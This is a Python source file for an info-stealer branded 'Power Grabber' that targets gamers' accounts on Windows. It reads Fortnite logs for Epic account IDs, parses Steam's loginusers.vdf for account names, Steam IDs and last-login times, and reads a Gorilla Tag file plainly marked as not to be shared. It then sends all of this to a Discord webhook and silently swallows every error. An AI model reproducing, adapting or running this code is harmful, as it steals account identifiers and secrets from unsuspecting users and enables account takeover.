import os
import re
import requests
import datetime
import json
from Crypto.Cipher import AES
from base64 import b64decode
file_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'LocalLow', 'Another Axiom', 'Gorilla Tag', 'DoNotShareWithAnyoneEVERNoMatterWhatTheySay.txt')
app_data_path = os.getenv('APPDATA')
log_file_path = os.path.join(app_data_path, r"..\Local\FortniteGame\Saved\Logs\FortniteGame.log")
account_name = None
def find_user_info(log_file_path):
    global account_name
    try:
        with open(log_file_path, 'r', encoding='utf-8') as file:
            for line in file:
                match = re.search(r'UserId=\[([^\]]+)\].*DisplayName=\[([^\]]+)\].*EpicAccountId=\[([^\]]+)\]', line)
                if match:
                    user_id = match.group(1)
                    display_name = match.group(2)
                    epic_account_id = match.group(3)
                    account_name = display_name
                    return user_id, display_name, epic_account_id
        return None, None, None
    except FileNotFoundError:
        pass
        return None, None, None
def send_to_discord(display_name, user_id, epic_account_id, image_url):
    embed = {
        "embeds": [
            {
                "title": f"**{display_name}'s Fornite info:**",
                "color": 0x8b0000,
                "thumbnail": {
                    "url": image_url
                },
                "fields": [
                    {
                        "name": "👤Epic Account name:",
                        "value": display_name,
                        "inline": True
                    },
                    {
                        "name": "User ID:",
                        "value": user_id,
                        "inline": True
                    },
                    {
                        "name": "Epic Account ID:",
                        "value": epic_account_id,
                        "inline": True
                    },
                    {
                        "name": "Fortnite Tracker URL:",
                        "value": f"https://fortnitetracker.com/profile/all/{display_name}",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Power Grabber | Made by Powercascade and Taktikal.exe",
                    "icon_url": image_url
                }
            }
        ]
    }
    response = requests.post(webhook_url, json=embed)
    if response.status_code == 204:
        pass
    else:
        pass
user_id, display_name, epic_account_id = find_user_info(log_file_path)
img = {
    'image_url': 'https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true'
}
image_url = img['image_url']
if user_id and display_name and epic_account_id:
    send_to_discord(display_name, user_id, epic_account_id, image_url)
else:
    pass
STEAM_DEFAULT_PATHS = [
    "C:\\Program Files (x86)\\Steam",
    "C:\\Program Files\\Steam",
    os.path.expanduser("~\\AppData\\Local\\Steam")
]
def is_steam_installed():
    for path in STEAM_DEFAULT_PATHS:
        steam_exe_path = os.path.join(path, "steam.exe")
        if os.path.exists(steam_exe_path):
            return path
    return None
def convert_timestamp_to_human_readable(timestamp):
    dt = datetime.datetime.utcfromtimestamp(timestamp)
    return dt.strftime("%B | %d | %Y %I:%M:%S %p")
def get_account_name_and_steam_id_from_vdf(vdf_path):
    accounts = []
    try:
        with open(vdf_path, "r", encoding="utf-8") as file:
            data = file.read()
            users_section = re.findall(r'"(\d{17})"\s*{(.*?)}', data, re.DOTALL)
            for steam_id, user_data in users_section:
                account_name_match = re.search(r'"AccountName"\s+"(.*?)"', user_data)
                persona_name_match = re.search(r'"PersonaName"\s+"(.*?)"', user_data)
                timestamp_match = re.search(r'"Timestamp"\s+"(\d+)"', user_data)
                account_name = account_name_match.group(1) if account_name_match else "N/A"
                persona_name = persona_name_match.group(1) if persona_name_match else "N/A"
                timestamp = int(timestamp_match.group(1)) if timestamp_match else None
                if timestamp:
                    timestamp = convert_timestamp_to_human_readable(timestamp)
                accounts.append((steam_id, account_name, persona_name, timestamp))
        return accounts
    except FileNotFoundError:
        pass
        return None
    except PermissionError:
        pass
        return None
def send_webhook(account_name, persona_name, steam_id, timestamp, image_url):
    games_url = f"https://steamcommunity.com/id/{steam_id}/games"
    wishlist_url = f"https://steamcommunity.com/id/{steam_id}/wishlist"
    embed = {
        "embeds": [
            {
                "title": f"🎮 Steam Account Info for **{account_name}**",
                "description": "Here is some steam info for this user.",
                "color": 0x8b0000,
                "thumbnail": {
                    "url": image_url
                },
                "fields": [
                    {
                        "name": "👤 **Account Name:**",
                        "value": f"**{account_name}**",
                        "inline": True
                    },
                    {
                        "name": "**Persona Name:**",
                        "value": f"{persona_name}",
                        "inline": False
                    },
                    {
                        "name": "🪪 **Steam ID**",
                        "value": f"{steam_id}",
                        "inline": False
                    },
                    {
                        "name": "👤 **User's Profile:**",
                        "value": f"[Click Me](https://steamcommunity.com/profiles/{steam_id})",
                        "inline": False
                    },
                    {
                        "name": "💿 **User's Game Library:**",
                        "value": f"[Click Me]({games_url})",
                        "inline": False
                    },
                    {
                        "name": "🌠 **User's Wishlist:**",
                        "value": f"[Click Me]({wishlist_url})",
                        "inline": False
                    },
                    {
                        "name": "🕝 **Last Login:**",
                        "value": f"{timestamp}",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Power Grabber | Created by Powercascade & Taktikal.exe",
                    "icon_url": image_url
                },
                "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
            }
        ]
    }
    try:
        response = requests.post(webhook_url, json=embed)
        if response.status_code == 204:
            pass
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass
def main():
    steam_install_path = is_steam_installed()
    if steam_install_path:
        config_path = os.path.join(steam_install_path, "config")
        vdf_path = os.path.join(config_path, "loginusers.vdf")
        accounts = get_account_name_and_steam_id_from_vdf(vdf_path)
        if accounts:
            sent_accounts = set()
            for steam_id, account_name, persona_name, timestamp in accounts:
                if steam_id not in sent_accounts:
                    send_webhook(account_name, persona_name, steam_id, timestamp, image_url)
                    sent_accounts.add(steam_id)
        else:
            pass
    else:
        pass
if __name__ == "__main__":
    main()
try:
    with open(file_path, 'r') as file:
            contents = file.read()
    embed = {
            "avatar_url": image_url,
            "embeds": [{
                "title": f"**{account_name}'s Gorilla Tag ID**",
                "description": contents,
                "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
                "thumbnail": {
                    "url": image_url
                },
                "footer": {
                    "text": "Power Grabber | Created by Powercascade & Taktikal.exe",
                    "icon_url": image_url
                },
                "color": 0x8b0000,
            }]
        }
    response = requests.post(webhook_url, data=json.dumps(embed), headers={"Content-Type": "application/json"})
    if response.status_code == 204:
        pass
    else:
        pass
except FileNotFoundError:
    pass
except Exception as e:
    pass
